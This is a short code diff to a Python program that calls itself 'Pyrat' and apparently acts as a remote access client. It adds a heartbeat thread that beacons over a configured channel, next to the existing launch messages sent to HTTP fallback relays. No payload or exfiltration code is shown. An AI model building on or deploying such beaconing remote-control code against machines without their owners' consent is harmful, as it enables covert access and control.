@@ -16,7 +16,9 @@ import random
 import subprocess
 import signal
 from collections import deque
-from utils.utils import load_config, get_file_list
+from utils.utils import get_file_list
+from utils.config import load_config, get_heart_beat_channel
+from utils.heartbeat import HeartBeatThread
 import queue
 import socket
 from datetime import datetime
@@ -60,6 +62,8 @@ _relays = []
 _http_fallbacks = []
 
 _selected_socket = None
+
+_heart_beat_thread = None
 
 macros = Macros("macros.json")
 
@@ -1152,6 +1156,11 @@ def main():
         console_thread.start()
         console_thread.join()
     else:
+        _heart_beat_channel = get_heart_beat_channel()
+        if _heart_beat_channel is not None:
+            _heart_beat_thread = HeartBeatThread(_heart_beat_channel, enc_keys)
+            _heart_beat_thread.start()
+
         for http_fallback in _http_fallbacks:
             while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Pyrat launched: " + formatted_datetime):
                 time.sleep(5)
